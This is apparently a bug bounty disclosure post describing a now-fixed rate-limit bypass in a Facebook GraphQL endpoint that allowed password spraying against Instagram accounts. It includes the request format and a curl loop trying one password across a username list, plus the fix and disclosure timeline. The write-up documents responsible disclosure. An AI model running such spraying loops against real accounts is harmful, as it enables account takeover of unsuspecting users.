---
id: 396
title: 'Ability to bruteforce Instagram account&#8217;s password due to lack of rate limitation protection'
date: '2020-03-11T13:33:27+00:00'
author: qw
layout: post
guid: 'https://ysamm.com/?p=396'
categories:
    - Uncategorized
---

**Description**

This bug could allow an attacker to bruteforce the password of Instagram users. This happens because certain Facebook GraphQL Query implements authentication to Instagram to link the account to a certain dashboard. This endpoint seems to block the attacker after certain number of requests for a chosen Username, however, if we try the same password with different username each time, then we won’t get blocked. Exploiting this, we can distinguish the correct password from the different responses we get with each try.

**Reproduction**

To test this, send a POST request to **https://www.facebook.com/api/graphql** (cookies aren’t needed) with the following parameters in the body:

`__a=1<br></br>doc_id=REDACTED&<br></br>variables={"data":{"business_id":BUSINESS_ID,"page_id":PAGE_ID,"username":"USERNAME","password":"PASSWORD"}}`

where BUSINESS_ID and PAGE_ID are both ids of random business and page ids. USERNAME is the targeted Instagram username and PASSWORD is the fixed password

Using curl, we can run an attack against a list of usernames with a fixed password (in this example 123456)

`while read user; do curl -k -i -X POST https://www.facebook.com/api/graphql/ -H 'Content-Type: application/x-www-form-urlencoded' -d "__a=1&doc_id=REDACTED&variables={\"data\":{\"business_id\":RANDOM,\"page_id\":RANDOM,\"username\":\"$user\",\"password\":\"123456\"}}";done < USER_LIST`

where **USER_LIST** is a file which contains a list of Instagram usernames.

The response to successful authentications would be

`(<br></br> "cm_ig_authentication": {<br></br>"is_authenticated": true<br></br>} )`

**Impact**

A malicious user could run this against a huge list of Instagram usernames with a fixed password, after that attack is finished he changes the password. The time between each password try for a certain account is long so this would bypass the rate limitation for the password field too ( bypassing the 20 tries rate limit of the password field).

**The Fix**

Facebook fixed this by implementing rate limitation to the “username” field along with the “password” field.

**Timeline**

Feb 4, 2020 — Report Sent  
Feb 11, 2020 — Acknowledged by Facebook  
Mar 9, 2020 — Fixed by Facebook  
Mar 10, 2020 — Bounty Awarded by Facebook